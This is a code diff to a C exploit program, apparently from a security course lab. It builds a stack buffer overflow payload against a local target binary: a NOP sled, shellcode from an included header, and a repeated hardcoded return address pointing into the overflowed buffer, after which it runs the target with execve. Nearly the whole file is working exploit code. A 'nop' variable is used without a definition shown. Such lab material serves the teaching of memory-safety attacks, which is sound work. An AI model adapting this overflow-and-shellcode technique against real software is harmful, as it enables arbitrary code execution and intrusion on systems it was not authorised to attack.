@@ -5,44 +5,60 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
+#define NOP_NUM 16
 
-// 46th byte is null in shell code
-#define SHELL_LENGTH 45 
-// NO-OP operation 
-#define NOP 0x90
-
-int
-main ( int argc, char * argv[] )
+int main(int argc, char *argv[])
 {
-	char *	args[3];
-	char *	env[1];
-	
-	// NULL out executing variables
+	char *args[3];
+	char *env[1];
+
+	args[0] = TARGET;
+	/* \x90 is NOP for intel x86 processor */
+	/*
+          By inspecting the runtime target with gdb we find that 
+          &buf is located at 2021fe10
+          120(0x78) character is needed to overflow the return address
+         */
+	/*  */
+	char exploit_str[256];
+	// Padding number of nop at the begging of buffer
+	strcpy(exploit_str, nop);
+	int i;
+	for (i = 0; i < NOP_NUM - 1; i++)
+	{
+		strcat(exploit_str, nop);
+	}
+
+	// inject the shell code
+	strcat(exploit_str, shellcode);
+
+	// Padding the end of str with return address pointing to &buf
+	// align the address
+	int exlen = strlen(exploit_str);
+	int align = (exlen + 1) % 4;
+	if (align != 0)
+	{
+		for (i = 0; i < align + 1; i++)
+		{
+			strcat(exploit_str, nop);
+		}
+	}
+
+	// appending return addrs
+	while (strlen(exploit_str) <= 120)
+	{
+		strcat(exploit_str, "\x50\xfe\x21\x20"); // Little endian
+	}
+
+	args[1] = exploit_str;
+	/* Debug log */
+	/* printf("args[1] length %lu\n", strlen(args[1])); */
+	/* printf("%s \n", exploit_str); */
 	args[2] = NULL;
 	env[0] = NULL;
 
-	// Initialize explit string
-	char attack_buff[124];
-	
-	// zero out attack_buff for sanity
-	bzero(attack_buff, 124);
-	
-	// concat shellcode to exploit
-	strcat(attack_buff, shellcode); 
-
-	// set NOP from end of SHELL_LENGTH to the 120th byte
-	memset(&attack_buff[SHELL_LENGTH], NOP, 120 - SHELL_LENGTH);
-
-	// overwrite return address with buf start address
-	char* target_addr = (char*)0x2021fe50; 
-
-	// fill final byte with return address
-	memcpy(&attack_buff[120], &(target_addr), sizeof(target_addr));
-
-	args[1] = attack_buff;
-
-	if (execve (TARGET, args, env) < 0 )
-		fprintf (stderr, "execve failed.\n");
+	if (execve(TARGET, args, env) < 0)
+		fprintf(stderr, "execve failed.\n");
 
 	return (0);
 }
